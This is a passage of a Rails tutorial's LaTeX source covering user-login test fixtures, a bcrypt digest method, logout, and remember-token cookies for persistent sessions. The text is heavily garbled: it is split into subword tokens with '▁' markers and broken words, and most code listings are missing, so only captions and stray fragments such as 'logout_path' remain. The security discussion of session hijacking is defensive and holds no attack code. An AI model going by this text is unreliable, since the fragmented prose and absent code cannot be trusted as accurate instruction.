▁We ▁ discover ed ▁in ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁we ▁needed ▁to ▁delete ▁the ▁default ▁fixtures ▁so ▁that ▁our ▁email ▁uniqueness ▁tests ▁would ▁pass ▁( Listing ~\ ref { code : empty _ fixtures }).
▁Now ▁we ' re ▁ready ▁to ▁start ▁ filling ▁in ▁that ▁empty ▁file ▁with ▁custom ▁fixtures ▁of ▁our ▁own .
▁In ▁the ▁present ▁case , ▁we ▁need ▁only ▁one ▁user , ▁who se ▁information ▁should ▁consist ▁of ▁a ▁valid ▁name ▁and ▁email ▁address .
▁Because ▁we ' ll ▁need ▁to ▁log ▁the ▁user ▁in , ▁we ▁also ▁have ▁to ▁include ▁a ▁valid ▁password ▁to ▁compare ▁with ▁the ▁password ▁submitted ▁to ▁the ▁Sessions ▁controller ' s ▁\ k ode { create } ▁action .
▁Re f er r ing ▁to ▁the ▁data ▁model ▁in ▁F igure ~\ ref { fig : user _ model _ password _ digest }, ▁we ▁see ▁that ▁this ▁means ▁creating ▁a ▁\ k ode { password \_ digest } ▁attribute ▁for ▁the ▁user ▁fixture , ▁which ▁we ' ll ▁accomplish ▁by ▁defin ing ▁a ▁\ k ode { digest } ▁method ▁of ▁our ▁own .
▁As ▁discuss ed ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁the ▁password ▁digest ▁is ▁created ▁using ▁bcrypt ▁( via ▁\ k ode { has \_ secure \_ password }), ▁so ▁we ' ll ▁need ▁to ▁create ▁the ▁fixture ▁password ▁using ▁the ▁same ▁method .
▁By ▁ inspect ing ▁the ▁\ href { https :// github . com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password . rb }{ secure ▁password ▁source ▁code }, ▁we ▁find ▁that ▁this ▁method ▁is
▁where ▁\ k ode { string } ▁is ▁the ▁string ▁to ▁be ▁hash ed ▁and ▁\ k ode { co st } ▁is ▁the ▁\ emph { co st ▁parameter } ▁that ▁determine s ▁the ▁com put ation al ▁co st ▁to ▁calculat e ▁the ▁hash .
▁Using ▁a ▁high ▁co st ▁make s ▁it ▁com put ation ally ▁in tr ac table ▁to ▁use ▁the ▁hash ▁to ▁determine ▁the ▁original ▁password , ▁which ▁is ▁an ▁important ▁security ▁precaution ▁in ▁a ▁production ▁environment , ▁but ▁in ▁tests ▁we ▁want ▁the ▁\ k ode { digest } ▁method ▁to ▁be ▁as ▁ fa st ▁as ▁possible .
▁The ▁secure ▁password ▁source ▁code ▁has ▁a ▁line ▁for ▁this ▁as ▁well :
▁This ▁rather ▁ ob sc ure ▁code , ▁which ▁you ▁don ' t ▁need ▁to ▁understand ▁in ▁detail , ▁arrange s ▁for ▁precise ly ▁the ▁behavior ▁describe d ▁above : ▁it ▁uses ▁the ▁minimum ▁co st ▁parameter ▁in ▁tests ▁and ▁a ▁normal ▁( high ) ▁co st ▁parameter ▁in ▁production .
▁( We ' ll ▁learn ▁more ▁about ▁the ▁strange ▁\ k ode { ? } - \ k ode { : } ▁notation ▁in ▁Section ~\ ref { sec : remember _ me _ checkbox }. )
▁There ▁are ▁sever al ▁place s ▁we ▁could ▁put ▁the ▁result ing ▁\ k ode { digest } ▁method , ▁but ▁we ' ll ▁have ▁an ▁opportunit y ▁in ▁Section ~\ ref { sec : remember _ token } ▁to ▁reuse ▁\ k ode { digest } ▁in ▁the ▁User ▁model .
▁This ▁suggest s ▁ placing ▁the ▁method ▁in ▁\ k ode { user . rb }.
▁Because ▁we ▁won ' t ▁necessar ily ▁have ▁access ▁to ▁a ▁user ▁object ▁when ▁calculat ing ▁the ▁digest ▁( as ▁will ▁be ▁the ▁case ▁in ▁the ▁fixtures ▁file ), ▁we ' ll ▁attach ▁the ▁\ k ode { digest } ▁method ▁to ▁the ▁User ▁class ▁itself , ▁which ▁( as ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : const ru c to r s }) ▁make s ▁it ▁a ▁\ emph { class ▁method }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : digest _ method }
▁ Adding ▁a ▁digest ▁method ▁for ▁use ▁in ▁fixtures .
▁# ▁Return s ▁the ▁hash ▁digest ▁of ▁the ▁given ▁string .
▁With ▁the ▁\ k ode { digest } ▁method ▁from ▁Listing ~\ ref { code : digest _ method }, ▁we ▁are ▁now ▁ready ▁to ▁create ▁a ▁user ▁fixture ▁for ▁a ▁valid ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : re al _ user _ fixture }.
▁A ▁fixture ▁for ▁testing ▁user ▁login .
▁Note ▁in ▁particular ▁that ▁fixtures ▁support ▁ embedded ▁Ruby , ▁which ▁allows ▁us ▁to ▁use
▁to ▁create ▁the ▁valid ▁password ▁digest ▁for ▁the ▁test ▁user .
▁A lthough ▁we ' ve ▁defined ▁the ▁\ k ode { password \_ digest } ▁attribute ▁required ▁by ▁\ line break ▁\ k ode { has \_ secure \_ password }, ▁some times ▁it ' s ▁convenient ▁to ▁refer ▁to ▁the ▁plain ▁( v ir t u al ) ▁password ▁as ▁well .
▁U nfortunately , ▁this ▁is ▁i mp ossible ▁to ▁arrange ▁with ▁fixtures , ▁and ▁adding ▁a ▁\ k ode { password } ▁attribute ▁to ▁Listing ~\ ref { code : re al _ user _ fixture } ▁cause s ▁Rails ▁to ▁complain ▁that ▁there ▁is ▁no ▁such ▁column ▁in ▁the ▁database ▁( which ▁is ▁true ).
▁We ' ll ▁make ▁do ▁by ▁a do p ting ▁the ▁convention ▁that ▁all ▁fixture ▁users ▁have ▁the ▁same ▁password ▁(\ k ode { ' password ' }).
▁Having ▁created ▁a ▁fixture ▁with ▁a ▁valid ▁user , ▁we ▁can ▁retrieve ▁it ▁inside ▁a ▁test ▁as ▁follows :
▁Here ▁\ k ode { users } ▁correspond s ▁to ▁the ▁fixture ▁filename ▁\ k ode { users . yml }, ▁while ▁the ▁symbol ▁\ k ode { : michael } ▁reference s ▁user ▁with ▁the ▁key ▁show n ▁in ▁Listing ~\ ref { code : re al _ user _ fixture }.
▁With ▁the ▁fixture ▁user ▁as ▁above , ▁we ▁can ▁now ▁write ▁a ▁test ▁for ▁the ▁layout ▁links ▁by ▁convert ing ▁the ▁sequence ▁ enumerate d ▁at ▁the ▁beginning ▁of ▁this ▁section ▁into ▁code , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }.
▁A ▁test ▁for ▁user ▁logging ▁in ▁with ▁valid ▁information .
▁ logout _ path
▁Here ▁we ' ve ▁used
▁to ▁check ▁the ▁right ▁redirect ▁target ▁and
▁to ▁actually ▁visit ▁the ▁target ▁page .
▁Listing ~\ ref { code : user _ login _ test _ valid _ information } ▁also ▁verifie s ▁that ▁the ▁login ▁link ▁disappear s ▁by ▁verify ing ▁that ▁there ▁are ▁\ emph { zero } ▁login ▁path ▁links ▁on ▁the ▁page :
▁By ▁including ▁the ▁extra ▁\ k ode { count : ▁0 } ▁option , ▁we ▁tell ▁\ k ode { assert \_ select } ▁that ▁we ▁expect ▁there ▁to ▁be ▁ zero ▁links ▁matching ▁the ▁given ▁pattern .
▁( Compar e ▁to ▁\ k ode { count : ▁2 } ▁in ▁Listing ~\ ref { code : layout _ links _ test }, ▁which ▁check s ▁for ▁exactly ▁two ▁matching ▁links .)
▁Because ▁the ▁application ▁code ▁was ▁already ▁working , ▁this ▁test ▁should ▁be ▁\ line break ▁\ passing :
▁ $ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test . rb ▁\ < n >> ▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁This ▁shows ▁how ▁to ▁run ▁a ▁specific ▁test ▁within ▁a ▁test ▁file ▁by ▁passing ▁the ▁option
▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁containing ▁the ▁name ▁of ▁the ▁test . ▁( A ▁test ' s ▁name ▁is ▁just ▁the ▁word ▁`` test '' ▁and ▁the ▁words ▁in ▁the ▁test ▁description ▁join ed ▁using ▁ underscore s .)
▁A lthough ▁our ▁authentication ▁system ▁is ▁now ▁working , ▁new ly ▁registered ▁users ▁m ight ▁be ▁confuse d , ▁as ▁they ▁are ▁not ▁logged ▁in ▁by ▁default .
▁Because ▁it ▁would ▁be ▁strange ▁to ▁force ▁users ▁to ▁log ▁in ▁immediately ▁after ▁sign ing ▁up , ▁we ' ll ▁log ▁in ▁new ▁users ▁automatically ▁as ▁part ▁of ▁the ▁signup ▁process .
▁To ▁arrange ▁this ▁behavior , ▁all ▁we ▁need ▁to ▁do ▁is ▁add ▁a ▁call ▁to ▁\ k ode { log \_ in } ▁in ▁the ▁Users ▁controller ▁\ k ode { create } ▁action , ▁as ▁show n ▁in ▁Listing ~\ ref { code : login _ upon _ signup }
▁As ▁with ▁the ▁Sessions ▁controller , ▁the ▁\ k ode { log \_ in } ▁method ▁is ▁available ▁in ▁the ▁Users ▁controller ▁because ▁of ▁the ▁module ▁inclusion ▁in ▁Listing ~\ ref { code : sessions _ helper _ include }.
▁Logging ▁in ▁the ▁user ▁upon ▁signup .
▁To ▁test ▁the ▁behavior ▁from ▁Listing ~\ ref { code : login _ upon _ signup }, ▁we ▁can ▁add ▁a ▁line ▁to ▁the ▁test ▁from ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁to ▁check ▁that ▁the ▁user ▁is ▁logged ▁in .
▁It ' s ▁helpful ▁in ▁this ▁context ▁to ▁define ▁a ▁\ k ode { is \_ logged \_ in ?}\ ▁helper ▁method ▁to ▁parallel ▁the ▁\ k ode { logged \_ in ?}\ ▁helper ▁defined ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁which ▁returns ▁\ k ode { true } ▁if ▁there ' s ▁a ▁user ▁id ▁in ▁the ▁( test ) ▁session ▁and ▁false ▁otherwise ▁( Listing ~\ ref { code : test _ helper _ sessions }).
▁( Because ▁helper ▁methods ▁are n ' t ▁available ▁in ▁tests , ▁we ▁can ' t ▁use ▁the ▁\ k ode { current \_ user } ▁as ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁but ▁the ▁\ k ode { session } ▁method ▁is ▁available , ▁so ▁we ▁use ▁that ▁instead .)
▁Here ▁we ▁use ▁\ k ode { is \_ logged \_ in ?}\ ▁instead ▁of ▁\ k ode { logged \_ in ?}\ ▁so ▁that ▁the ▁test ▁helper ▁and ▁Sessions ▁helper ▁methods ▁have ▁different ▁names , ▁which ▁prevent s ▁them ▁from ▁being ▁mistake n ▁for ▁each ▁other
▁For ▁example , ▁I ▁once ▁ha d ▁a ▁test ▁suite ▁that ▁was ▁\ passing \ ▁even ▁after ▁accidental ly ▁deleting ▁the ▁main ▁\ k ode { log \_ in } ▁method ▁in ▁the ▁Sessions ▁helper .
▁The ▁reason ▁is ▁that ▁the ▁tests ▁were ▁h appily ▁using ▁a ▁test ▁helper ▁with ▁the ▁same ▁name , ▁there by ▁passing ▁even ▁though ▁the ▁application ▁was ▁completely ▁broken .
▁As ▁with ▁\ k ode { is \_ logged \_ in ? }, ▁we ' ll ▁avoid ▁this ▁issue ▁by ▁defin ing ▁the ▁test ▁helper ▁\ k ode { log \_ in \_ as } ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }.
▁A ▁boolean ▁method ▁for ▁login ▁status ▁inside ▁tests .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : test _ helper _ sessions }, ▁we ▁can ▁ assert ▁that ▁the ▁user ▁is ▁logged ▁in ▁after ▁signup ▁using ▁the ▁line ▁show n ▁in ▁Listing ~\ ref { code : login _ after _ signup _ test }.
▁A ▁test ▁of ▁login ▁after ▁signup .
▁At ▁this ▁point , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁As ▁discuss ed ▁in ▁Section ~\ ref { sec : sessions _ and _ failed _ login }, ▁our ▁authentication ▁model ▁is ▁to ▁keep ▁users ▁logged ▁in ▁un til ▁they ▁log ▁out ▁explicitly .
▁In ▁this ▁section , ▁we ' ll ▁add ▁this ▁necessary ▁ logout ▁c ap ability .
▁Because ▁the ▁`` Log ▁out '' ▁link ▁has ▁already ▁been ▁defined ▁( Listing ~\ ref { code : layout _ login _ logout _ links }), ▁all ▁we ▁need ▁is ▁to ▁write ▁a ▁valid ▁controller ▁action ▁to ▁destroy ▁user ▁sessions .
▁So ▁far , ▁the ▁Sessions ▁controller ▁actions ▁have ▁followed ▁the ▁RESTful ▁convention ▁of ▁using ▁\ k ode { new } ▁for ▁a ▁login ▁page ▁and ▁\ k ode { create } ▁to ▁complete ▁the ▁login .
▁We ' ll ▁continu e ▁this ▁the me ▁by ▁using ▁a ▁\ k ode { destroy } ▁action ▁to ▁delete ▁sessions , ▁i . e . , ▁to ▁log ▁out .
▁Un like ▁the ▁login ▁functionality , ▁which ▁we ▁use ▁in ▁both ▁Listing ~\ ref { code : log _ in _ success } ▁and ▁Listing ~\ ref { code : login _ upon _ signup }, ▁we ' ll ▁only ▁be ▁logging ▁out ▁in ▁one ▁place , ▁so ▁we ' ll ▁put ▁the ▁relevant ▁code ▁directly ▁in ▁the ▁\ k ode { destroy } ▁action .
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : remember _ tests }, ▁this ▁design ▁( with ▁a ▁little ▁refactoring ) ▁will ▁also ▁make ▁the ▁authentication ▁machinery ▁easier ▁to ▁test .
▁Some ▁browsers ▁offer ▁a ▁`` \ href { http :// stack overflow . com / questions / 20 44 9 64 1 / rails - 4 - session - value - never - expire s - or - d ies - when - browser - close s }{ remember ▁where ▁I ▁left ▁off } '' ▁feature , ▁which ▁re store s ▁the ▁session ▁automatically , ▁so ▁be ▁sure ▁to ▁disable ▁any ▁such ▁feature ▁before ▁try ing ▁to ▁log ▁out .
▁Setting ▁\ k ode {@ current \_ user } ▁to ▁\ k ode { nil } ▁would ▁only ▁matter ▁if ▁\ k ode {@ current \_ user } ▁were ▁created ▁before ▁the ▁\ k ode { destroy } ▁action ▁( which ▁it ▁is n ' t ) ▁\ emph { and } ▁if ▁we ▁did n ' t ▁issue ▁an ▁imm edia t e ▁redirect ▁( which ▁we ▁do ).
▁This ▁is ▁an ▁unlike ly ▁combination ▁of ▁even t s , ▁and ▁with ▁the ▁application ▁as ▁present ly ▁construct ed ▁it ▁is n ' t ▁necessary , ▁but ▁because ▁it ' s ▁security - rel at ed ▁I ▁include ▁it ▁for ▁completeness .
▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ out _ method }.
▁The ▁\ k ode { log \_ out } ▁method .
▁# ▁ Log s ▁out ▁the ▁current ▁user .
▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ session }.
▁ Destroy ing ▁a ▁session ▁( user ▁ logout ).
▁To ▁test ▁the ▁ logout ▁machinery , ▁we ▁can ▁add ▁some ▁steps ▁to ▁the ▁user ▁login ▁test ▁from ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }.
▁After ▁logging ▁in , ▁we ▁use ▁\ k ode { delete } ▁to ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁to ▁the ▁ logout ▁path ▁( Table ~\ ref { table : RESTful _ sessions }) ▁and ▁verify ▁that ▁the ▁user ▁is ▁logged ▁out ▁and ▁redirect ed ▁to ▁the ▁root ▁URL . ▁We ▁also ▁check ▁that ▁the ▁login ▁link ▁re app e ar s ▁and ▁that ▁the ▁ logout ▁and ▁profile ▁links ▁disappear .
▁The ▁new ▁steps ▁appear ▁in ▁Listing ~\ ref { code : user _ logout _ test }.
▁A ▁test ▁for ▁user ▁ logout .
▁( N o w ▁that ▁we ▁have ▁\ k ode { is \_ logged \_ in ?}\ ▁available ▁in ▁tests , ▁we ' ve ▁also ▁throw n ▁in ▁a ▁b on us ▁\ k ode { assert ▁is \_ logged \_ in ?}\ ▁immediately ▁after ▁post ing ▁valid ▁information ▁to ▁the ▁sessions ▁path .)
▁The ▁login ▁system ▁we ▁finished ▁in ▁Section ~\ ref { sec : logging _ in } ▁is ▁self - contain ed ▁and ▁fully ▁functional , ▁but ▁most ▁website s ▁have ▁the ▁ additional ▁c ap ability ▁of ▁remember ing ▁users ' ▁sessions ▁even ▁after ▁they ▁close ▁their ▁browsers .
▁In ▁this ▁section , ▁we ' ll ▁start ▁by ▁remember ing ▁user ▁login s ▁by ▁default , ▁ ex p ir ing ▁their ▁sessions ▁only ▁when ▁they ▁explicitly ▁log ▁out .
▁In ▁Section ~\ ref { sec : remember _ me _ checkbox }, ▁we ' ll ▁enable ▁a ▁common ▁ alternative ▁model , ▁a ▁`` remember ▁me '' ▁checkbox ▁that ▁allows ▁users ▁to ▁opt ▁out ▁of ▁being ▁remember ed .
▁Bo th ▁of ▁these ▁models ▁are ▁p rofessional - grade , ▁with ▁the ▁first ▁used ▁by ▁site s ▁such ▁as ▁\ href { http :// github . com /}{ GitHub } ▁and ▁\ href { http :// bitbucket . org /}{ B it b uck et }, ▁and ▁the ▁second ▁used ▁by ▁site s ▁such ▁as ▁\ href { http :// www . fa ce book . com /}{ F a ce book } ▁and ▁\ href { http :// twitter . com /}{ T w it ter }.
▁In ▁Section ~\ ref { sec : logging _ in }, ▁we ▁used ▁the ▁Rails ▁\ k ode { session } ▁method ▁to ▁store ▁the ▁user ' s ▁id , ▁but ▁this ▁information ▁disappear s ▁when ▁the ▁user ▁close s ▁their ▁browser .
▁In ▁this ▁section , ▁we ' ll ▁take ▁the ▁first ▁step ▁toward ▁ persistent ▁sessions ▁by ▁ generating ▁a ▁\ emph { remember ▁token } ▁appropriate ▁for ▁creating ▁ permanent ▁cookies ▁using ▁the ▁\ k ode { cookies } ▁method , ▁together ▁with ▁a ▁secure ▁\ emph { remember ▁digest } ▁for ▁ authenticating ▁those ▁token s .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method }, ▁information ▁store d ▁using ▁\ k ode { session } ▁is ▁automatically ▁secure , ▁but ▁this ▁is ▁not ▁the ▁case ▁with ▁information ▁store d ▁using ▁\ k ode { cookies }.
▁In ▁particular , ▁ persistent ▁cookies ▁are ▁vulnerable ▁to ▁\ href { http :// en . wiki p edia . org / wiki / Session _ hijack ing }{ session ▁ hijack ing }, ▁in ▁which ▁an ▁attacker ▁uses ▁a ▁stolen ▁remember ▁token ▁to ▁log ▁in ▁as ▁a ▁particular ▁user .
▁ Session ▁ hijack ing ▁was ▁ wide ly ▁public ize d ▁by ▁the ▁\ href { http :// code but ler . com / fi re s h eep }{ F ir es h eep } ▁application , ▁which ▁show ed ▁that ▁remember ▁token s ▁at ▁many ▁high - profile ▁site s ▁were ▁visible ▁when ▁connect ed ▁to ▁public ▁Wi - F i ▁network s .
▁We ▁prevent ed ▁the ▁first ▁problem ▁in ▁Section ~\ ref { sec : p rofessional _ grade _ deploy ment } ▁by ▁using ▁\ href { https :// en . wiki p edia . org / wiki / Trans port _ L a y er _ Security }{ S ec ure ▁So c k et s ▁L a y er } ▁( SSL ) ▁site - wide , ▁which ▁protect s ▁network ▁data ▁from ▁p ac k et ▁ s n if f ers .
▁We ' ll ▁prevent ▁the ▁second ▁problem ▁by ▁storing ▁a ▁hash ▁digest ▁of ▁the ▁remember ▁token ▁instead ▁of ▁the ▁token ▁itself , ▁in ▁much ▁the ▁same ▁way ▁that ▁we ▁store d ▁password ▁digest s ▁instead ▁of ▁raw ▁passwords ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }.
▁Rails ▁automatically ▁prevent s ▁the ▁third ▁problem ▁by ▁es ca p ing ▁any ▁content ▁inserted ▁into ▁view ▁templates .
▁F inally , ▁although ▁there ' s ▁no ▁ ir on - c la d ▁way ▁to ▁stop ▁attacker s ▁who ▁have ▁ ph y s ical ▁access ▁to ▁a ▁logged - in ▁computer , ▁we ' ll ▁ mini m ize ▁the ▁four th ▁problem ▁by ▁changing ▁token s ▁every ▁time ▁a ▁user ▁log s ▁out ▁and ▁by ▁tak ing ▁care ▁to ▁\ emph { crypt ographic ally ▁sign } ▁any ▁ potentially ▁ sensitive ▁information ▁we ▁place ▁on ▁the ▁browser .
▁With ▁these ▁design ▁and ▁security ▁consider ation s ▁in ▁mind , ▁our ▁plan ▁for ▁creating ▁ persistent ▁sessions ▁appears ▁as ▁follows :
▁Create ▁a ▁random ▁string ▁of ▁d i git s ▁for ▁use ▁as ▁a ▁remember ▁token .
▁P la ce ▁the ▁token ▁in ▁the ▁browser ▁cookies ▁with ▁an ▁ expiration ▁date ▁far ▁in ▁the ▁future .
▁S a ve ▁the ▁hash ▁digest ▁of ▁the ▁token ▁to ▁the ▁database .
▁P la ce ▁an ▁encrypted ▁version ▁of ▁the ▁user ' s ▁id ▁in ▁the ▁browser ▁cookies .
▁When ▁present ed ▁with ▁a ▁cookie ▁containing ▁a ▁ persistent ▁user ▁id , ▁find ▁the ▁user ▁in ▁the ▁database ▁using ▁the ▁given ▁id , ▁and ▁verify ▁that ▁the ▁remember ▁token ▁cookie ▁matches ▁the ▁ associated ▁hash ▁digest ▁from ▁the ▁database .
▁Note ▁how ▁similar ▁the ▁final ▁step ▁is ▁to ▁logging ▁a ▁user ▁in , ▁where ▁we ▁retrieve ▁the ▁user ▁by ▁email ▁address ▁and ▁the n ▁verify ▁( using ▁the ▁\ k ode { authenticate } ▁method ) ▁that ▁the ▁submitted ▁password ▁matches ▁the ▁password ▁digest ▁( Listing ~\ ref { code : find _ authenticate _ user }).
▁As ▁a ▁result , ▁our ▁implementation ▁will ▁parallel ▁aspect s ▁of ▁\ k ode { has \_ secure \_ password }.
▁We ' ll ▁start ▁by ▁adding ▁the ▁required ▁\ k ode { remember \_ digest } ▁attribute ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : user _ model _ remember _ digest }.
▁The ▁User ▁model ▁with ▁an ▁added ▁\ k ode { remember \_ digest } ▁attribute .
▁To ▁add ▁the ▁data ▁model ▁from ▁F igure ~\ ref { fig : user _ model _ remember _ digest } ▁to ▁our ▁application , ▁we ' ll ▁generate ▁a ▁migration :
▁( Compar e ▁to ▁the ▁password ▁digest ▁migration ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }. )
▁As ▁in ▁previous ▁migrations , ▁we ' ve ▁used ▁a ▁migration ▁name ▁that ▁end s ▁in ▁\ k ode { \_ to \_ users } ▁to ▁tell ▁Rails ▁that ▁the ▁migration ▁is ▁design ed ▁to ▁alter ▁the ▁\ k ode { users } ▁table ▁in ▁the ▁database .
▁Because ▁we ▁also ▁included ▁the ▁attribute ▁(\ k ode { remember \_ digest }) ▁and ▁type ▁(\ k ode { string }), ▁Rails ▁generates ▁a ▁default ▁migration ▁for ▁us , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }.
▁The ▁generated ▁migration ▁for ▁the ▁remember ▁digest .
▁Because ▁we ▁don ' t ▁expect ▁to ▁retrieve ▁users ▁by ▁remember ▁digest , ▁there ' s ▁no ▁need ▁to ▁put ▁an ▁index ▁on ▁the ▁\ k ode { remember \_ digest } ▁column , ▁and ▁we ▁can ▁use ▁the ▁default ▁migration ▁as ▁generated ▁above :
▁Now ▁we ▁have ▁to ▁decide ▁what ▁to ▁use ▁as ▁a ▁remember ▁token .
▁There ▁are ▁many ▁most ly ▁equivalent ▁possibilities --- es s ent i ally , ▁any ▁long ▁random ▁string ▁will ▁do .
▁This ▁choice ▁is ▁base d ▁on ▁the ▁\ href { http :// r ailscasts . com / episodes / 27 4 - remember - me - reset - password }{ RailsCast ▁on ▁remember ▁me }.
▁A ▁typical ▁base 64 ▁string ▁appears ▁as ▁follows :
▁Inde ed , ▁it ▁ha d ▁better ▁be ▁O K , ▁because ▁with ▁bcrypt ' s ▁\ href { https :// en . wiki p edia . org / wiki / S alt _ % 28 crypt o gr a ph y % 2 9 }{ s alt ed ▁hashes } ▁there ' s ▁no ▁way ▁for ▁us ▁to ▁tell ▁if ▁two ▁users ' ▁passwords ▁match .
▁With ▁unique ▁remember ▁token s , ▁an ▁attacker ▁always ▁needs ▁\ emph { b o th } ▁the ▁user ▁id ▁and ▁the ▁remember ▁token ▁cookies ▁to ▁ hijack ▁the ▁session .
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }.
▁Re member ing ▁users ▁involve s ▁creating ▁a ▁remember ▁token ▁and ▁saving ▁the ▁digest ▁of ▁the ▁token ▁to ▁the ▁database .
▁We ' ve ▁already ▁defined ▁a ▁\ k ode { digest } ▁method ▁for ▁use ▁in ▁the ▁test ▁fixtures ▁( Listing ~\ ref { code : digest _ method }), ▁and ▁we ▁can ▁use ▁the ▁results ▁of ▁the ▁discussion ▁above ▁to ▁create ▁a ▁\ k ode { new \_ token } ▁method ▁to ▁create ▁a ▁new ▁token .
▁As ▁a ▁general ▁rule , ▁if ▁a ▁method ▁does n ' t ▁need ▁an ▁instance ▁of ▁an ▁object , ▁it ▁should ▁be ▁a ▁class ▁method .
▁Inde ed , ▁this ▁d ec is ion ▁will ▁pro ve ▁important ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }.
▁in ▁Listing ~\ ref { code : token _ method }.
▁ Adding ▁a ▁method ▁for ▁ generating ▁token s .
▁Ou r ▁plan ▁for ▁the ▁implementation ▁is ▁to ▁make ▁a ▁\ k ode { user . remember } ▁method ▁that ▁associate s ▁a ▁remember ▁token ▁with ▁the ▁user ▁and ▁save s ▁the ▁corresponding ▁remember ▁digest ▁to ▁the ▁database .
▁Because ▁of ▁the ▁migration ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }, ▁the ▁User ▁model ▁already ▁has ▁a ▁\ k ode { remember \_ digest } ▁attribute , ▁but ▁it ▁does n ' t ▁yet ▁have ▁a ▁\ k ode { remember \_ token } ▁attribute .
▁We ▁need ▁a ▁way ▁to ▁make ▁a ▁token ▁available ▁via ▁\ k ode { user . remember \_ token } ▁( for ▁storage ▁in ▁the ▁cookies ) ▁\ emph { with out } ▁storing ▁it ▁in ▁the ▁database .
▁We ▁solve d ▁a ▁similar ▁issue ▁with ▁secure ▁passwords ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }, ▁which ▁pair ed ▁a ▁virtual ▁\ k ode { password } ▁attribute ▁with ▁a ▁secure ▁\ k ode { password \_ digest } ▁attribute ▁in ▁the ▁database .
▁In ▁that ▁case , ▁the ▁virtual ▁\ k ode { password } ▁attribute ▁was ▁created ▁automatically ▁by ▁\ k ode { has \_ secure \_ password }, ▁but ▁we ' ll ▁have ▁to ▁write ▁the ▁code ▁for ▁a ▁\ k ode { remember \_ token } ▁our s el ve s .
▁The ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁\ k ode { attr \_ accessor } ▁to ▁create ▁an ▁accessible ▁attribute , ▁which ▁we ▁saw ▁before ▁in ▁Section ~\ ref { sec : a _ user _ class } :
▁Note ▁the ▁form ▁of ▁the ▁assignment ▁in ▁the ▁first ▁line ▁of ▁the ▁\ k ode { remember } ▁method .
▁Because ▁of ▁the ▁way ▁Ruby ▁handle s ▁assignment s ▁inside ▁objects , ▁without ▁\ k ode { self } ▁the ▁assignment ▁would ▁create ▁a ▁\ emph { local } ▁variable ▁called ▁\ k ode { remember \_ token }, ▁which ▁is n ' t ▁what ▁we ▁want .
▁( N o w ▁you ▁know ▁why ▁the ▁\ k ode { before \_ save } ▁callback ▁from ▁Listing ~\ ref { code : email _ downcase } ▁uses ▁\ k ode { self . email } ▁instead ▁of ▁just ▁\ k ode { email }. )
▁ Meanwhile , ▁the ▁second ▁line ▁of ▁\ k ode { remember } ▁uses ▁the ▁\ k ode { update \_ attribute } ▁method ▁to ▁update ▁the ▁remember ▁digest . ▁(
▁As ▁noted ▁in ▁Section ~\ ref { sec : updating _ user _ objects }, ▁this ▁method ▁bypass es ▁the ▁validations , ▁which ▁is ▁necessary ▁in ▁this ▁case ▁because ▁we ▁don ' t ▁have ▁access ▁to ▁the ▁user ' s ▁password ▁or ▁confirmation .)
▁in ▁Listing ~\ ref { code : user _ model _ remember }.
▁ Adding ▁a ▁\ k ode { remember } ▁method ▁to ▁the ▁User ▁model .
▁Having ▁created ▁a ▁working ▁\ k ode { user . remember } ▁method , ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁create ▁a ▁ persistent ▁session ▁by ▁storing ▁a ▁user ' s ▁( encrypted ) ▁id ▁and ▁remember ▁token ▁as ▁ permanent ▁cookies ▁on ▁the ▁browser .
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁the ▁\ k ode { cookies } ▁method , ▁which ▁( as ▁with ▁\ k ode { session }) ▁we ▁can ▁treat ▁as ▁a ▁hash .
▁A ▁cookie ▁consist s ▁of ▁two ▁pieces ▁of ▁information , ▁a ▁\ k ode { value } ▁and ▁an ▁optional ▁\ k ode { expire s } ▁date .
▁For ▁example , ▁we ▁could ▁make ▁a ▁ persistent ▁session ▁by ▁creating ▁a ▁cookie ▁with ▁value ▁equal ▁to ▁the ▁remember ▁token ▁that ▁expire s ▁20 ~ years ▁from ▁now :
▁This ▁pattern ▁of ▁setting ▁a ▁cookie ▁that ▁expire s ▁20 ▁ years ▁in ▁the ▁future ▁is ▁so ▁common ▁that ▁Rails ▁has ▁a ▁special ▁\ k ode { permanent } ▁method ▁to ▁implement ▁it , ▁so ▁that ▁we ▁can ▁simply ▁write
▁remember _ token
▁Co o k ies ▁expire ▁\ text tt { 20 . years . from \_ now }
